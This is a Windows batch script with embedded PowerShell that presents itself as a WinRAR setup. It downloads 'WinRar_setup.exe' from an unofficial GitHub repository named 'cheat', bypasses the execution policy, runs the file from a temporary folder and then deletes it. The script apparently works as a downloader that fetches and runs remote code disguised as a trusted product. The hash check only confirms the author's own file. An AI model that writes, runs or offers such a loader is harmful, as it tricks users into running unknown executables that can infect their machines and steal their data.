@echo off
setlocal EnableExtensions

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=7eb70257593da06f682a3ddda54a9d260d4fc514f645237f5ca74b08f8da61a6"
set "OUT=%TEMP%\winrar_pkg_%RANDOM%.exe"

echo [1/4] Downloading...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='Stop';" ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "$u=$env:URL; $h=$env:HASH.ToLowerInvariant(); $f=$env:OUT;" ^
  "if(Test-Path -LiteralPath $f){Remove-Item -LiteralPath $f -Force};" ^
  "$ok=$false;" ^
  "try{& curl.exe -L -s -f -o $f $u; if((Test-Path -LiteralPath $f) -and ((Get-Item -LiteralPath $f).Length -gt 0)){$ok=$true}}catch{};" ^
  "if(-not $ok){try{(New-Object System.Net.WebClient).DownloadFile($u,$f); if((Test-Path -LiteralPath $f) -and ((Get-Item -LiteralPath $f).Length -gt 0)){$ok=$true}}catch{}};" ^
  "if(-not $ok){Write-Host 'ERROR: Download failed.'; exit 1};" ^
  "Write-Host '[2/4] Verifying SHA-256...';" ^
  "$cur=(Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash.ToLowerInvariant();" ^
  "if($cur -ne $h){Write-Host ('ERROR: Hash mismatch. Got: ' + $cur); Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue; exit 2};" ^
  "Write-Host '[3/4] Running installer...';" ^
  "$proc=Start-Process -FilePath $f -PassThru -Wait;" ^
  "Start-Sleep -Seconds 2;" ^
  "Write-Host '[4/4] Cleaning up...';" ^
  "Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue;" ^
  "exit $proc.ExitCode"

set "EC=%ERRORLEVEL%"
echo ExitCode: %EC%
if not "%EC%"=="0" pause
endlocal
exit /b %EC%
